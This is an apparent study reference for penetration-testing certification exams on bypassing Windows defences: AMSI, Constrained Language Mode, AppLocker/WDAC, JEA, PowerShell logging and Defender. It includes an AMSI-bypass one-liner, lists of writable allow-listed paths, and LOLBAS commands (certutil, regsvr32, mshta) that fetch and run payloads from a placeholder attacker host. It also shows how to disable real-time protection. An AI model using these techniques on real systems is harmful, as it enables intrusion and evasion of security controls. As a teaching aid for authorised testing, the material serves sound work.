## Scope and the Speed/Stealth Tradeoff

Be honest about what the engagement needs before spending time on evasion:

- **Most certification exams do NOT require evasion.** CRTP, CRTE, CPTS, and the OSCP AD set are not evasion exams — there is no blue team scoring you, no EDR hunting your shells. Disabling Defender in the lab (where the objective allows it) or simply running noisy tooling is usually the correct, time-efficient choice. Spending exam hours crafting an AMSI bypass you didn't need is a classic way to fail on the clock.
- **What these exams DO test** is the ability to work *through* a control that is switched on and in your way: a jump box in CLM, AMSI eating your `IEX`, AppLocker blocking your dropped binary. That is a functionality problem, not a red-team-vs-blue-team problem. This file exists for those blockers.
- **Real engagements** are where genuine stealth matters, and there the tradeoff is explicit: every technique here trades speed for a smaller footprint, and [opsec-and-detection.md](opsec-and-detection.md) tells you exactly what each noisy alternative lights up.
- **Public one-liners rot.** Every copy-pasteable AMSI/CLM bypass string below is, or will be, signatured by AMSI and AV. They are shown to teach the *mechanism*; on a patched, monitored host expect the literal string to be caught and to need re-obfuscation. Treat them as concepts with a shelf life, not as reliable payloads.

## AMSI

**What it is.** The Antimalware Scan Interface (AMSI) is a Windows API that lets scriptable engines submit content to the registered AV (Defender by default) *before execution*. It sees the deobfuscated script/command right before it runs, defeating simple encoding. Hooked surfaces include **PowerShell** (every command, script block, and `IEX`), the **.NET runtime** (`Assembly.Load` of in-memory assemblies, since .NET 4.8), the **Windows Script Host** (VBScript/JScript), **Office VBA macros**, and **WMI**.

**How it works internally.** The scripthost calls `AmsiScanBuffer` / `AmsiScanString` in `amsi.dll`. The buffer is handed to the AV provider, which returns a verdict; `AMSI_RESULT_DETECTED` (>= 32768) blocks execution. Every documented bypass targets one link in that chain: the buffer, the function, the result, or the provider registration.

**Bypass approaches (concepts, not reliable payloads):**
- **Memory patching** — overwrite the first bytes of `AmsiScanBuffer` in the current process so it returns `AMSI_RESULT_CLEAN` (or an error) without scanning. Process-local, resets on a new process. This is what most modern loaders do; the exact bytes/offsets are what get signatured.
- **`amsiInitFailed` reflection** — set the private `System.Management.Automation.AmsiUtils.amsiInitFailed` field to `$true`; PowerShell then skips scanning for the session. The oldest public trick, and the most heavily signatured — the literal string almost never survives.
- **Provider unregistration / DLL hijack** — remove or shadow the registered AMSI provider (requires admin / specific conditions).
- **Obfuscation** — break up the strings AMSI's signatures match on (concatenation, format operators, reordering, encoding, `Invoke-Obfuscation`). Buys time; does not defeat behavioural/emulation scanning.

**amsi.fail-style one-liner (illustrative — will be flagged on a current host):**
```powershell
# Reflection approach — the canonical public form; signatured, shown for mechanism only
[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
```
The string-splitting (`'Amsi'+'Utils'`) exists specifically to dodge the static signature — evidence that these break over time. https://amsi.fail generates freshly-obfuscated variants for exactly this reason; on a lab jump box, generate a new one rather than pasting a known string.

**Running tools when AMSI flags them:**
- Patch AMSI in the current process first, then `IEX` your script (order matters — the patch itself must not be scanned; load it obfuscated or via a small compiled stub).
- Run the tool **off PowerShell** entirely: compiled C# (Rubeus/Certify/SharpHound `.exe`) via a LOLBAS runner isn't subject to the PowerShell AMSI hook (though .NET-runtime AMSI and Defender-on-disk still apply).
- Break the script's own signatures (rename functions/variables, strip comments) — often a mislabeled "malicious" PowerView is just matching a public signature, and light obfuscation clears it.
- Where policy allows, disable real-time protection in the lab and move on.

## Constrained Language Mode (CLM)

**What it is.** A PowerShell mode that restricts the language to a safe subset. Commonly enforced on hardened jump boxes and by AppLocker/WDAC in "Allow" mode (CLM is applied automatically to any interactive PowerShell when a script-enforcement policy is active).

**Detect it first:**
```powershell
$ExecutionContext.SessionState.LanguageMode      # FullLanguage | ConstrainedLanguage | RestrictedLanguage
```

**What CLM blocks:** instantiating arbitrary .NET types (`New-Object` on non-allowlisted types), calling arbitrary .NET methods, `Add-Type`, COM object creation, direct Win32 API calls via reflection, and most in-memory offensive tradecraft. Approved cmdlets and core types still work — so it breaks your tooling, not your ability to read the environment.

**Escaping CLM (get back to FullLanguage or run outside PowerShell):**
- **PowerShell v2 downgrade** — v2 predates CLM entirely and runs in FullLanguage. If the v2 engine + .NET 2/3.5 are present, this is the simplest escape:
```powershell
powershell -version 2 -command "$ExecutionContext.SessionState.LanguageMode"   # -> FullLanguage if v2 available
```
- **Custom runspace from a compiled binary** — a C# program that creates its own `Runspace` gets FullLanguage unless a policy explicitly constrains it. Ships as an `.exe`, sidestepping the interactive-shell restriction.
- **Approved-binary / trusted-script escape** — a `.ps1` that lives in an AppLocker-*allowed* path runs in FullLanguage (CLM only applies to untrusted script). Drop your code into a writable, allow-listed directory (see [AppLocker / WDAC](#applocker--wdac)) and it runs unconstrained.
- **InstallUtil** — `installutil.exe` executes the `[System.ComponentModel.RunInstaller]`-attributed methods of a .NET assembly outside PowerShell's language engine:
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll
```
- **MSBuild** — `msbuild.exe` compiles and runs inline C# from a project XML file (`<Task>` in a `UsingTask`), executing outside CLM entirely:
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe evil.csproj    # inline-task C# runs in FullLanguage context
```
- **PowerShdll / dnx / other .NET hosts** — any host process that loads the automation engine with its own configuration can escape CLM if not policy-restricted.

Note: WDAC-enforced CLM (as opposed to AppLocker) also gates the .NET methods available to *compiled* code in some configurations, so InstallUtil/MSBuild escapes are less reliable under strict WDAC than under AppLocker.

## AppLocker / WDAC

**What they are.** Application-control policies. **AppLocker** allows/denies executables, scripts, MSIs, and DLLs by path, publisher, or hash. **WDAC** (Windows Defender Application Control, formerly Device Guard CI) is a stronger kernel-enforced code-integrity policy that is much harder to bypass and can enforce CLM.

**Enumerate the policy first:**
```powershell
Get-AppLockerPolicy -Effective -Xml                                  # the live effective policy
Get-AppLockerPolicy -Effective | Select -Expand RuleCollections
# Test whether a specific path would be allowed for you
Get-AppLockerPolicy -Effective -Xml | Out-File pol.xml
Test-AppLockerPolicy -XmlPolicy pol.xml -Path C:\Windows\Temp\x.exe -User Everyone
# WDAC: check for a running code-integrity policy
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```
Also read the raw policy from the registry / `%WINDIR%\System32\AppLocker\` if cmdlets are constrained.

**Default-rule bypass paths.** AppLocker's Microsoft-recommended *default rules* allow everything under `C:\Windows` and `C:\Program Files`. Standard users cannot normally write there — except for a handful of subdirectories that are both **inside an allowed path** and **writable by non-admins**. These are the classic escapes:
```
C:\Windows\Tasks
C:\Windows\Temp
C:\Windows\tracing
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\PRINTERS
C:\Windows\System32\Tasks   (varies)
C:\Windows\Registration\CRMLog
```
Find writable dirs under allowed paths dynamically:
```powershell
# accesschk (Sysinternals) — writable dirs under C:\Windows for the current user
accesschk.exe -uwds "Users" C:\Windows\ -q
# or built-in: probe by attempting to write
```
Drop your allowed-by-path binary/script into one of those and it executes despite AppLocker.

**LOLBAS in allowed paths / signed-binary proxy execution.** Because default rules trust everything Microsoft-signed under `C:\Windows`, the built-in signed binaries that *run other code* become the bypass — the policy allows the signed proxy, and the proxy runs your unsigned payload. See [LOLBAS](#lolbas-living-off-the-land-binaries) below. `msbuild.exe`, `installutil.exe`, `regsvr32.exe`, `mshta.exe`, and `rundll32.exe` are the workhorses here because they are always present, always signed, and execute arbitrary logic.

**WDAC reality check:** properly-configured WDAC (enforced, no audit mode, blocking these LOLBins via the Microsoft-recommended block list) defeats most of the above. Against strict WDAC, prefer approaches that don't drop or proxy code — or accept that this is a hard control and pivot to a less-locked-down host.

## Just Enough Administration (JEA)

**What it is.** A PowerShell-remoting feature that drops a connecting user into a locked-down constrained runspace exposing only a whitelisted set of cmdlets/functions, typically running under a privileged virtual/RunAs account. Common on hardened admin jump hosts — you land in a restricted endpoint over WinRM, not a full shell. Treat it like a restricted shell: enumerate what you are allowed, then find the weakest allowed verb.

**Enumerate the exposed surface.**
```powershell
Get-PSSessionConfiguration                                  # registered endpoints; note RunAsVirtualAccount + RoleDefinitions
Get-PSSessionCapability -ConfigurationName <name> -Username <you>   # what YOU can run on it
(Get-PSSessionConfiguration <name>).RoleDefinitions          # role -> capability (.psrc) mapping
# inside a JEA session:
Get-Command                                                  # the entire allowed surface
$ExecutionContext.SessionState.LanguageMode                  # usually NoLanguage/ConstrainedLanguage
```
Read the role-capability `.psrc` files the endpoint references — `VisibleCmdlets`, `VisibleFunctions`, `VisibleExternalCommands` list the exact allowed surface (and any parameter constraints).

**Where the escapes are.** JEA is rarely broken at the sandbox level; the weakness is an over-permissive role definition: a `VisibleCmdlet` exposed with unconstrained parameters (an allowed cmdlet that can run arbitrary code, write files, or set config), a `VisibleFunction` that wraps a dangerous operation, a `VisibleExternalCommand` pointing at a LOLBAS, or the RunAs virtual account holding rights you can leverage once you invoke any exposed command that reaches execution or file-write. Map the allowed surface, then pivot through the single most powerful allowed verb — under the endpoint's privileged identity.

## PowerShell Logging

Four layers a defender uses to reconstruct exactly what you ran. Know what each captures so you can predict your footprint. The event IDs and hunting side are in [opsec-and-detection.md](opsec-and-detection.md).

- **Script Block Logging** (event **4104**, `Microsoft-Windows-PowerShell/Operational`). Logs the *deobfuscated* content of every script block before execution — this is the big one, it defeats obfuscation because it records what actually runs. Warning-level 4104 fires on blocks Microsoft flags as suspicious even when full logging is off.
- **Module Logging** (event **4103**). Logs pipeline execution details (cmdlet + parameters/arguments) for configured modules.
- **Transcription** (`Start-Transcript`). Writes a full input/output text transcript to a file/share — includes your commands *and* their output, so it can capture cleartext creds you dumped.
- **ETW** (`Microsoft-Windows-PowerShell` provider). The underlying event stream feeding the above; EDR consumes it directly.

**Check what's enabled:**
```powershell
# Registry — policy that turns each on
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging 2>$null
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging 2>$null
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription 2>$null
```

**Reducing footprint (factual):**
- **Don't use PowerShell.** Compiled C# tooling run via a LOLBAS host does not produce 4103/4104 script-block logs (it still produces process/EDR telemetry). This is the single biggest reduction.
- **PowerShell v2 downgrade** — the v2 engine predates script-block logging and does not emit 4104 (assuming v2 is installed). Same downgrade used for CLM escape; note that *launching* v2 is itself a documented, alerted indicator.
- Understand that transcription can log to a remote share you can't reach or clear — assume anything you type in a transcribed session is recorded, including passwords.
- Log tampering (clearing 4104, unloading the ETW provider) is itself high-signal (event **1102** on log clear) and usually not worth it on an exam.

## LOLBAS (Living-off-the-Land Binaries)

Signed, Microsoft-shipped binaries ("living off the land") that can download, execute, or proxy code — the Windows equivalent of GTFOBins. They matter for AppLocker/WDAC bypass (trusted signer + allowed path) and for avoiding dropping obvious tools. Catalogue: https://lolbas-project.github.io.

**Caveat up front: these are the most heavily monitored binaries on the platform.** Every EDR has detections for `certutil` downloading, `regsvr32` fetching a remote `.sct`, `mshta` running remote HTA, `rundll32` with odd exports, and unusual parent/child chains (Office/`w3wp` spawning them). Using a LOLBin is *evasion of allow-listing*, not evasion of detection — on a monitored host it is often noisier than a plain tool. Use them to satisfy application-control, not to hide.

```cmd
:: certutil — download a file (also base64 decode); flagged constantly
certutil -urlcache -split -f http://<attacker>/tool.exe C:\Windows\Temp\tool.exe
certutil -decode payload.b64 payload.exe

:: regsvr32 — execute a remote scriptlet (Squiblydoo), no file dropped for the payload
regsvr32 /s /n /u /i:http://<attacker>/evil.sct scrobj.dll

:: mshta — run remote/inline HTA (JScript/VBScript)
mshta http://<attacker>/evil.hta
mshta vbscript:Close(Execute("CreateObject(""Wscript.Shell"").Run(""calc"")"))

:: rundll32 — call an exported function / run JS
rundll32.exe C:\Windows\Temp\evil.dll,EntryPoint
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();...

:: InstallUtil — run assembly logic outside PowerShell (also a CLM escape)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U payload.dll

:: MSBuild — compile + run inline C# from a project file (CLM escape, AppLocker bypass)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe evil.csproj
```
Also common: `wmic`, `bitsadmin /transfer` (download), `msiexec /q /i http://...` (remote MSI), `forfiles`/`pcalua` (exec proxy). Pick the one that is (a) present, (b) in an allowed path for the active policy, and (c) least likely to have an obvious parent-process anomaly in your context.

## Defender / AV Basics

**On-access (real-time) scanning.** Defender scans files as they are written/read/executed. A known-bad tool written to disk is quarantined *before* you can run it — this is why "it worked in my VM" tools vanish on target. Signatures + cloud lookup + behavioural/emulation all apply.

**When to work off-disk.** If a binary trips on-access scanning, keep it out of the filesystem: load it reflectively into an existing process's memory (in-memory assembly load, process injection) so nothing hits disk for the scanner to catch. This trades the on-access signature risk for AMSI-for-.NET and EDR behavioural detection — off-disk is not invisible, just past the file scanner.

**Encoding vs real evasion — the key distinction.** Base64-encoding a payload (`-EncodedCommand`, `certutil -decode`) defeats *only* signatures that match the encoded-at-rest bytes. It does **not** evade AMSI (which sees the decoded content at runtime) and does not evade behavioural detection. Encoding is an obfuscation/transport convenience, not evasion. Real evasion changes *what the defender observes at execution time* — patching the scan API, running unsignatured code, avoiding the monitored code path — not merely how the payload is stored.

**Quick posture check:**
```powershell
Get-MpComputerStatus | Select RealTimeProtectionEnabled, AMSIEnabled, IsTamperProtected, AntivirusSignatureVersion
Get-MpPreference | Select DisableRealtimeMonitoring, ExclusionPath, ExclusionExtension
```
Exclusion paths are gold: anything under an AV exclusion is not scanned — drop and run there. In labs where the objective permits, disabling real-time protection (`Set-MpPreference -DisableRealtimeMonitoring $true`, requires admin + no tamper protection) is faster than evasion.

## Controls -> Bypass Quick Reference

| Control | Detect | Primary escape (concept) | Notes |
|---|---|---|---|
| AMSI | tool "flagged"/blocked in PowerShell | patch `AmsiScanBuffer` in-proc; run compiled C#; obfuscate | public strings are signatured; regenerate |
| CLM | `$ExecutionContext.SessionState.LanguageMode` | PS v2 downgrade; C# runspace; allowed-path `.ps1`; InstallUtil/MSBuild | WDAC-enforced CLM is stricter than AppLocker's |
| AppLocker | `Get-AppLockerPolicy -Effective` | writable dir under allowed path; signed LOLBAS proxy | default rules trust `C:\Windows`, `C:\Program Files` |
| JEA | `Get-PSSessionConfiguration`, `Get-PSSessionCapability` | over-permissive VisibleCmdlets/Functions/ExternalCommands; RunAs privilege | constrained runspace, not a full shell — abuse the allowed surface |
| WDAC | `Win32_DeviceGuard` CIM class | hard — avoid drop/proxy; pivot to a laxer host | kernel-enforced; blocks most LOLBins |
| Script-block logging | reg `...\PowerShell\ScriptBlockLogging` | avoid PowerShell (compiled tooling); PS v2 | 4104 logs deobfuscated content |
| Defender on-access | `Get-MpComputerStatus` | work in memory; AV exclusion paths; disable if in scope | encoding != evasion |

For the detection signature each of these leaves behind — the events a defender correlates — cross-reference [opsec-and-detection.md](opsec-and-detection.md). And re-read the top section before you invest exam time: on CRTP/CRTE/CPTS/OSCP, the fastest correct move is usually the loud one.
